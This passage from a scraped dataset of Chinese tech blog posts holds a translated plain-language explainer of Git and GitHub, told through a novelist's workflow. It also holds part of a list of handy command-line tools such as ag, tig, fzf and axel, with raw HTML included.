["http://wx4.sinaimg.cn/large/63918611gy1ff87fb6lahj20ib0a8n51.jpg"], "fav_nums": 4, "comment_nums": 0, "create_date": "2017/05/03", "praise_nums": 1}
{"tags": " 2 评论 ,Git,Github,IT技术", "front_image_path": "full/099774d99d1417d2fd9047e2e802db4ced3179c5.jpg", "title": "大白话解释 Git 和 GitHub", "url_object_id": "465760c151650c2c990cfa9661af173e", "url": "http://blog.jobbole.com/111187/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://red-badger.com/blog/2016/11/29/gitgithub-in-plain-english\">Red Radger</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>本文旨在使用通俗易懂的文字，讲解版本控制背后的理论，以便你能对程序员们如何工作有个全局概念。本文不涉及代码，不用下载啥东西，循序渐进，不关注繁复细节，只有文字和一些不怎么漂亮的手绘涂鸦。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1ffofj1eoiyg20pk0eedgn.gif\" width=\"600\" height=\"338\"></p>\n<h2>写本文的动机</h2>\n<p>学习任何东西都能在网络上找到如此之多的指导教程，这一直令我惊讶不已。Git 和 Github 也不例外，网络上有大量优秀资源，这些资源要么只对其中一个，要么兼顾二者引导你开始学习。以下是我特别喜欢的一些资源：</p>\n<ul>\n<li><a href=\"http://blog.teamtreehouse.com/git-for-designers-part-1\" target=\"_blank\">Treehouse – 写给设计师的 Git 入门介绍</a></li>\n<li><a href=\"http://rogerdudler.github.io/git-guide/\" target=\"_blank\">Roger Dudler – Git 简易教程</a></li>\n<li><a href=\"https://www.pluralsight.com/blog/software-development/github-tutorial\" target=\"_blank\">Pluralsight – Github：初学者指南</a></li>\n</ul>\n<p>然而，我发现这些教程总是跳过许多理论知识，直接解释如何通过命令行或 Github 桌面应用程序使用 Git 。坦白说，如果你只是想知道你的开发团队谈论的到底是什么，这些指导教程也绰绰有余了。如上所述，我的目标是对版本控制的整体概念进行简明扼要地讲解，同时希望能让你了解到版本控制是如此酷。</p>\n<h2>让我们从最基础的开始：版本控制</h2>\n<p><em><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1ffofj1wi8wj20d406mq3o.jpg\" width=\"472\" height=\"238\"></em></p>\n<p style=\"text-align: center;\"><em><span style=\"color: #808080;\">Image credit: weebletheringskite, WordPress</span></em></p>\n<p>版本控制（Version control）:学习它，爱上它，享受它。顾名思义，<strong>版本控制系统是任何能让你了解到一个文件的历史，以及它的发展过程的系统。</strong>之前作为平面设计师时，我常常会遇到这种文件：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1ffofj2t62hj20b406nwfj.jpg\" width=\"400\" height=\"239\"></p>\n<p>看起来眼熟？尽管上述系统不是一个好用的系统 ，但它确实是一个版本控制系统。更复杂点的例子就像，Google 文档的 “修订历史”或  Photoshop 的“历史”工具。</p>\n<h2> 开始 Git</h2>\n<p><strong>Git </strong><strong>是一种专为处理文本文件而设计的版本控制系统。</strong>因为，归根到底，这就是代码的本质：一堆堆以某种方式联合在一起的文本文件。Git 是一个可安装应用，它允许你对你自己所做的更改进行注释，用以创建易于导航的系统历史。</p>\n<p>（附： “Git”  也是工程师取的名字，我们对市场部同仁感到抱歉）</p>\n<p><strong>那么，</strong><strong> Git </strong><strong>做了什么，是简单地保存文件所做不到的呢？</strong>从根本上讲，文件保存就是一个简化的版本控制系统，但坦率地说，它并不是一个好用的系统，因为它只能前进。当然，你也许会争论“撤消”按钮可以让你的文件回滚到以前的状态。但我们都清楚，“撤消”按钮有其局限性，最明显示的是，在关闭文件时，文件的过去也随之丢失。</p>\n<p>另外，文件保存是非常个人化的。它不能够显示整个系统的历史，只能够显示该文件的。针对这一点，你可能会想，“嗯，我不是一个工程师，我不需要为系统烦恼”。我愿意花些时间来解释一下，很多事情你认为不是“系统”，而实际上它们就是。</p>\n<p><strong>以  Sally为例，她是一个正在写下一个大冒险奇幻小说系列的作家。</strong>Sally 已经写完该系列小说中的第一本，并把它传给了她的编辑。此外，由于她才华出众，在等待编辑的反馈的同时，她还写了第二本书的前三章。每本书都建立了独立的 World 文件。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1ffofj32av3j20ku0bqdgp.jpg\" width=\"690\" height=\"388\"></p>\n<p>在某个快乐的日子，Sally  等来了她的编辑关于第一本书的反馈。他担心年轻的读者不想读一系列专写兽人故事的书，希望她在这个故事中引入一些精灵。关于这点，Sally  叹了口气，但很快意识到，她的精灵新角色将带来始料未及的冲突和曲折的情节。然后，她做了以下事情：</p>\n<ul>\n<li>在第一本书中加入新角色，并修改故事情节。</li>\n<li>完成第一本书之后，对第二本书的故事情节，进行必要的修改。</li>\n<li>所有的这些修改，导致她需要引入某个地理位置到第一本书中，而不是第二本书。</li>\n<li>重新编辑第一本书，让它包含新的地理位置。</li>\n</ul>\n<p>终于，她推开了她的键盘，确信已经把精灵融入到了她的奇幻世界之中。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1ffofj3zzlvj20ku0ixabq.jpg\" width=\"690\" height=\"627\"></p>\n<p>你瞧，Sally 实际上在处理一个系统。她的两本书互相影响。角色、地理位置和故事情节在两本书中流动交织。然而，遗憾的是，一个月后，她的文件系统里什么都没有了。Word 的 “文档历史”工具，或她曾经粘贴在显示屏边缘用于记录修改过程的便签纸，将把所有的变化过程都揉合在一起。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1ffofj4dj6vj20ku0hidhf.jpg\" width=\"690\" height=\"580\"></p>\n<p>这正是Git 大放光芒之处。如果 Sally 一直结合 Git 使用Word，她就能对所有这些相关的变化做一个关于“将精灵引入到系列”的简洁小结。她可以看到所有穿插在页、章节、文件，以及每本书中的修改记录，让她真正地了解引入精灵对她的奇幻系列产生的影响。这个“简洁的小结”就是我们在 Git 领域中所讲的<strong>提交（</strong><strong>commit</strong><strong>）</strong>。</p>\n<p><strong>回顾一下</strong>。 Git 是一个软件，它允许你通过提交对一个系统（或一组）文件的历史进行注释。这些提交便是在给定时间点对系统做出的差异“快照”。</p>\n<p>那么，如果我是Sally，我的<strong>提交历史</strong>看起来是这样子的：</p>\n<h2><strong><a href=\"http://jbcdn2.b0.upaiyun.com/2016/12/f1727ddec3c0dada075793786d81decc.jpg\"><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1ffofj4vmyqj20ku0fzdhc.jpg\"></a><br>\nGithub</strong></h2>\n<p>到目前为止，一切都还不错。但是，<strong>如果 Sally 同时用到两台电脑工作，将会发生什么呢？</strong>问得好。这时，就该用到 Github了。注意，不要和 Git 混淆了。Github 获取 Git 中的提交历史，并将其存储在互联网上，因此你可以从任一一台电脑访问它。你在本机（例如：你当前正在使用的电脑）<strong>推送（</strong><strong>pushing</strong><strong>）</strong>提交到 Github，然后，从另一台新的或不同的电脑上<strong>拉取（</strong><strong>pulling</strong><strong>）</strong>这些提交。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1ffofj5of16j20ku0cd75j.jpg\"></p>\n<p>让我们假设上图为 Sally 的工作流程。她在家里的台式电脑（左边，橘黄色的）上开启她一天的工作。接下来，她完成了几个章节的写作，又做了一些编辑工作，等等。整个过程中，她对工作总共进行了三次策略性的“快照”（Git 提交）。</p>\n<p>下午，Sally 常常喜欢带着她的笔记本电脑（上图中的右侧，蓝色的）去咖啡馆写作。今天也不例外。因此，在关闭家里的台式电脑之前，她需要确认当前的Git 提交历史已<strong>推送（</strong><strong>push</strong><strong>）</strong>到了在线Github。一旦被上传到 Github，这些提交记录就被存储在<strong>远程仓库（</strong><strong>remote repository</strong><strong>）</strong>中。</p>\n<p>我们先来分析一下几个计算机术语：<strong>远程（</strong><strong>remote）</strong>仅仅意味着联网（与“本地”的意思相反，和之前我们理解到的意思一样的，代表当前正在使用的电脑）。而<strong>仓库（</strong><strong>repository，经常简写为“repo”</strong>），就是一个具备 Git 超级权限的文件夹。</p>\n<p>因此，<strong>Github 就是让你把工作（通过Git提交进行注解）存储在了一个指定的在线文件夹（repo）</strong>。明白了吧？简单。</p>\n<p>午餐之后，在当地的一家咖啡馆中，Sally 拿出了她的笔记本电脑。很明显，她想接着家里的工作进度继续。因些，她从 Github 仓库上获取到最新进度的工作。“从 Github 上获取她的工作”，这一过程就叫<strong>拉取（</strong><strong>pulling</strong><strong>）</strong>。再看一下上面这幅图片，你将看到 Sally 拉取了之前她在家时进行的三个提交。</p>\n<p>现在，在她的笔记本电脑上，Sally 有整个系统（包含她的幻想系列的所有文本文件）的最新的完整副本，并能够基于上次的进度，继续工作。她写了更多的章节，对工作进行了两次以上的策略“快照”（提交）。最后，Sally 把这些提交<strong>推送</strong>（<strong>push</strong>）到 Github 上，结束了这一天的工作。这样第二天上午的时候，在家里的台式电脑上就可以取得这些最新进度的工作。</p>\n<h2>协同工作</h2>\n<p>好吧，这一切都能说得通。但是， Sally再如何酷，整个项目也只有她一人而已。<strong>工程团队要如何确保他们的工作不会重叠？</strong></p>\n<p>简而言之，创建分支。将你的 Git 提交历史想像成一棵树。树的主干就是我们谈到的主分支。为了让团队成员避免彼此牵扯，他们在独立于他人的隔离区（在一个功能分支）进行工作，然而最终，每个人的工作成果都会被提交到主代码库 （主分支）。</p>\n<p>现在，回到 Sally 的例子。她加入了奇幻作家协会，在这里每个人都与他人合作完成这本书——《奇幻系列生物辞典》。这本辞典更像一本教材，由多个作者共同完成：Sally、Tom 和 Adam。</p>\n<p>让我们来看看《奇幻系列生物辞典》项目的在线 Github 仓库，现在的情况是：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1ffofj5zx9vj20ku0hdq53.jpg\"></p>\n<p>如上图所示，树的类比完全适用于奇幻作家协会在这个项目上的合作情况，仓库历史沿主分支向上移动。常规工作流始于每个作者为完成一个工作任务（例如编写章节内容，或排版章节）而在主分支上创建分支。只有当更改得到其他合作作家的批准时，分支才会被合并到主分支上（请谨记，主分支上的内容，才是最终要发布的内容）。</p>\n<p>当一个分支的内容<strong>合并（</strong><strong>merged</strong><strong>）</strong>到主分支时，意味着该分支的内容会覆盖主分支上的。因此，现有内容的任何更改都将会替代之前的。当然，任何新添加的内容也会添加到主分支。实际上，当分支合并到主分支时，该分支的提交历史被添加到主分支提交历史的顶部。</p>\n<p>然而，你可能正在思考：<strong>人们在本机的工作和之后才推送到 Github 的工作变更是如何连接到一起的呢？</strong></p>\n<p>关于这个问题，重点在于：你在 Github 的远程仓库是你本机工作项目的一个镜像。这意味着，你在自己的电脑里存储了该项目（例如：一个已设置可进行 Git 提交的文件夹）的本地 Git 仓库。在这个本地的 Git 仓库（再次，这是一个特定术语，指你的电脑里某个启用了 Git 功能的文件夹）中，你拥有与该项目相关的所有文件，在本文的例子中，即《奇幻系列生物辞典》。</p>\n<p>它的工作原理很像 Dropbox ：你在不同的设备（你的家庭电脑、办公室电脑，等等）上创建本地文件夹，进行工作并更新这些文件。最后，这些操作被同步到网络上。然而，我们知道，Git/Github 工作流还包含了一些额外的步骤。首先，你必须有意识地对某一时刻的工作执行“快照”（即执行一次提交）。然后，你必须特意地推送这些提交（push） 到 Github。只有这样，你的工作才被同步到网络上的位置（Github 版本库）。</p>\n<p>既然如此，为什么不自动化该工作流呢？为什么不让它像 Dropbox一样，当你更新本地文件时，同时自动更新 Github 上的文件？有很多理由让我们不这么做。最主要的理由是——bugs 。同出版界一样，软件工程中也不是所有写过的东西都要保留。有时，你希望实验一下你的想法，如果实验失败，你希望有一种简单的方式能让工作快速回滚到之前的正确状态上。这也是为什么我们提倡这个经验法则，即在你试图用不同的方法编辑或实验之前，先对当前你希望保留的修改进行提交。频繁地提交小块工作有益无害，事实上，许多工程师为自己能做到这一点而感到自豪。</p>\n<p>现在，回到《奇幻系列生物辞典》。由于  Sally 对兽族有较深的了解，她被挑选为写兽族章节。但她不想在没有经过其它合作人员允许的情况下去修改这本书，于是，她创建了一个本地分支，并在该分支上进行写作和提交。然后，<strong>她将本地分支推送到 Github</strong>。像往常一样，Github 的远程仓库是本地库的一个镜像，最新进展显示 Sally 已创建了一个包含部分提交的分支（如下图所示）。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1ffofj6qbgpj20ku0h6405.jpg\"></p>\n<p>随着她对本章节的持续写作，Sally 进行了更多的提交，并将它们推送到 Github 的在线镜像分支。终于，她准备请 Tom 和 Adam 一起对她的工作进行评审。因此，她在 Github 上发布了一个 <strong>Pull Request（发布请求）</strong>，这是一个 Github 功能，允许她解释该分支相对于主分支做了哪些修改。Github 还提供了一个简易平台，合作人员可以在该平台上针对分支的修改内容进行讨论，并要求 Sally 在分支合并到主分支之前对一些有异议的内容进行修改。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/7cc829d3gy1ffofj7m86oj20ku0fndhe.jpg\"></p>\n<p>在对部分内容请求修改后，如上图所示，Tom 和 Adam 对 Sally 的分支内容很满意，并决定将她的工作成果合并到 Github 的主分支上。此时，他们所要做的就是将 Sally 之前独立提交的内容，添加到主分支的提交历史顶部：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1ffofj7ymv4j20b40eutbq.jpg\"></p>\n<p>此时，Sally可以切换（或<strong>“check out”</strong>）到本地计算机上的主分支，并将先前在功能分支（兽人章节分支）中的独立提交拉取下来。现在她又要在新的主分支上重新开始了：以该主分支为基础为她的下一步工作创建一个新的本地分支，帮助汤姆编辑有关妖精的章节。因此，这一过程又将重复:</p>\n<ol>\n<li>创建本地分支</li>\n<li>在本地分支上编辑修改，然后提交</li>\n<li>推送提交（Push）到 Github</li>\n<li> 创建发布请求（Pull Request），说明该分支包含了哪些更改</li>\n<li>合并（Merge）分支内容到主分支</li>\n<li>将主分支上的最新提交拉取（pull）到本地</li>\n<li>重复上述步骤</li>\n</ol>\n<p>正如你所看到的，这是一个非常流畅的工作流，完美地结合了独立工作与团队协作。你本机的 Git 提供了一个绝妙的方法，即通过由你自己控制和策划的丰富的历史提交，来创建你工作的各种版本。Github 是一个非常棒的在线版本控制工具，不仅存储和提供了清晰的可视化历史记录，而且还能进行协同工作和质量控制。</p>\n<p>总而言之，我希望我已经说服你去<strong>尝试使用 Git  和 Github 进行任何项目</strong>。没有理由只有工程师能从这个很棒的工具中受益。毕竟，我们也想看到更多有关兽人的故事。</p>\n<h2></h2>\n<h3>致谢：</h3>\n<p>非常感谢 <a href=\"https://www.youtube.com/channel/UCs-SOeljpyBAvS6fYAR2egw\">Common Craft</a> 对本文的涂鸦和解释风格的启发。还要感谢这个视频《 <a href=\"https://www.youtube.com/watch?v=ddO9idmax0o\">saving me from the horror of having to explain Twitter to my mum</a> 》。</p>\n<h3>本文涉及的术语</h3>\n<ul>\n<li><strong>Version Control（版本控制）:</strong> 任何一个能够让你了解文件的历史，以及该文件的发展进程的系统。</li>\n<li><strong>Git</strong><strong>：</strong>一个版本控制程序，通过对变更进行注释，以创建一个易于遍历的系统历史。</li>\n<li><strong>Commit（提交）</strong><strong>：</strong>在指定时间点对系统差异进行的注释 “快照”。</li>\n<li><strong>Local（本地）</strong><strong>：</strong>指任意时刻工作时正在使用的电脑。</li>\n<li><strong>Remote（远程）</strong><strong>：</strong> 指某个联网的位置。</li>\n<li><strong>Repository (仓库，简称 repo)</strong><strong>：</strong>配置了Git超级权限的特定文件夹，包含了你的项目或系统相关的所有文件。</li>\n<li><strong>Github</strong><strong>：</strong>获取本地提交历史记录，并进行远程存储，以便你可以从任何计算机访问这些记录。</li>\n<li><strong>Pushing（推送）</strong><strong>：</strong>取得本地Git提交（以及相关的所有工作），然后将其上传到在线Github。</li>\n<li><strong>Pulling（拉取）</strong><strong>：</strong>从在线的Github上获取最新的提交记录，然后合并到本地电脑上。</li>\n<li><strong>Master (branch)</strong><strong>：主分支，</strong>提交历史 “树”的 “树干”，包含所有已审核的内容/代码。</li>\n<li><strong>Feature branch（功能分支/特性分支）：</strong>一个基于主分支的独立的位置，在再次并入到主分支之前，你可以在这里安全地写工作中的新任务。</li>\n<li><strong>Pull Request（发布请求）</strong><strong>：</strong>一个 Github 工具，允许用户轻松地查看某功能分支的更改 （the difference或 “diff”），同时允许用户在该分支合并到主分支之前对其进行讨论和调整。</li>\n<li><strong>Merging（合并）</strong><strong>：</strong>该操作<strong>指</strong>获取功能分支的提交，加入到主分支提交历史的顶部。</li>\n<li><strong>Checking out（切换）</strong><strong>：</strong>该操作指从一个分支切换到另一个分支。</li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111187\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111187votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111187\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 24 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">听风</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/9538B04AD8C6883F49C38BC8ECDDAF3C/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q4000052677\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q4000052677/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q4000052677/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 19</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1ffofj32av3j20ku0bqdgp.jpg"], "fav_nums": 24, "comment_nums": 2, "create_date": "2017/05/18", "praise_nums": 4}
{"tags": " 1 评论 ,IT技术,命令行", "front_image_path": "full/2f706391ee65fdfc16b116b90f76185b162f1029.jpg", "title": "有哪些命令行的软件堪称神器？", "url_object_id": "6eeea46b5cdc0967a25e60ee0aa5eac0", "url": "http://blog.jobbole.com/111072/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.zhihu.com/question/59227720/answer/163594782\">int32bit（已授权转载）</a>   </div><p><b><a class=\" wrap external\" href=\"https://github.com/ggreer/the_silver_searcher\" target=\"_blank\" rel=\"nofollow noreferrer\">ag<i class=\"icon-external\"></i></a>：</b>比grep、ack更快的递归搜索文件内容。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lc6lm06j20go0azdig.jpg\" width=\"600\" height=\"395\"></p>\n<p><b><a class=\" wrap external\" href=\"https://github.com/jonas/tig\" target=\"_blank\" rel=\"nofollow noreferrer\">tig<i class=\"icon-external\"></i></a>：</b>字符模式下交互查看git项目，可以替代git命令。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1ff8lc7fx0uj20go09278u.jpg\" width=\"600\" height=\"326\"></p>\n<p><b><a class=\" wrap external\" href=\"https://github.com/dbcli/mycli\" target=\"_blank\" rel=\"nofollow noreferrer\">mycli<i class=\"icon-external\"></i></a>：</b>mysql客户端，支持语法高亮和命令补全，效果类似ipython，可以替代mysql命令。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lc83fejj20go08tq55.jpg\" width=\"600\" height=\"317\"></p>\n<p>jq: json文件处理以及格式化显示，支持高亮，可以替换python -m json.tool。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1ff8lc8s1rdj20go0ah0uv.jpg\" width=\"600\" height=\"377\"></p>\n<p><b><u><a class=\" wrap external\" href=\"https://github.com/koalaman/shellcheck\" target=\"_blank\" rel=\"nofollow noreferrer\">shellcheck<i class=\"icon-external\"></i></a>：</u></b>shell脚本静态检查工具，能够识别语法错误以及不规范的写法。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1ff8lc9h2ccj20go07mjs7.jpg\" width=\"600\" height=\"274\"></p>\n<div>\n<p><b><u><a class=\" wrap external\" href=\"https://github.com/google/yapf\" target=\"_blank\" rel=\"nofollow noreferrer\">yapf<i class=\"icon-external\"></i></a>：</u></b>Google开发的python代码格式规范化工具，支持pep8以及Google代码风格。</p>\n<p><b><u><a class=\" wrap external\" href=\"https://mosh.org/%23getting\" target=\"_blank\" rel=\"nofollow noreferrer\">mosh<i class=\"icon-external\"></i></a>：基于UDP的终端连接，</u></b>可以替代ssh，连接更稳定，即使IP变了，也能自动重连。</p>\n<p><b><a class=\" wrap external\" href=\"https://github.com/junegunn/fzf\" target=\"_blank\" rel=\"nofollow noreferrer\">fzf<i class=\"icon-external\"></i></a>：</b>命令行下模糊搜索工具，能够交互式智能搜索并选取文件或者内容，配合终端ctrl-r历史命令搜索简直完美。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1ff8lca3g0dj20go0c6wlj.jpg\" width=\"600\" height=\"438\"></p>\n<p><b><u><a class=\" wrap external\" href=\"https://github.com/facebook/PathPicker\" target=\"_blank\" rel=\"nofollow noreferrer\">PathPicker(fpp)<i class=\"icon-external\"></i></a>:</u></b>在命令行输出中自动识别目录和文件，支持交互式，配合git非常有用。</p>\n<p>运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ebc501316264\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit diff HEAD~8 --stat | fpp</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f185ebc501316264-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f185ebc501316264-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">diff </span><span class=\"crayon-v\">HEAD</span><span class=\"crayon-o\">~</span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">stat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>\n</p></div>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lcanda0j20go08jdix.jpg\" width=\"600\" height=\"307\"></p>\n<p><b><u><a class=\" wrap external\" href=\"https://hisham.hm/htop/\" target=\"_blank\" rel=\"nofollow noreferrer\">htop<i class=\"icon-external\"></i></a>: </u></b>提供更美观、更方便的进程监控工具，<b><u>替代top命令。</u></b></p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff8lcbfk4dj20go096afc.jpg\" width=\"600\" height=\"330\"></p>\n<p><b><u><a class=\" wrap external\" href=\"http://axel.alioth.debian.org/\" target=\"_blank\" rel=\"nofollow noreferrer\">axel<i class=\"icon-external\"></i></a>：</u></b>多线程下载工具，下载文件时可以替代curl、wget。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f185ec8316003213\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\naxel -n 20 http://centos.ustc.edu.cn/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1511.iso</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" 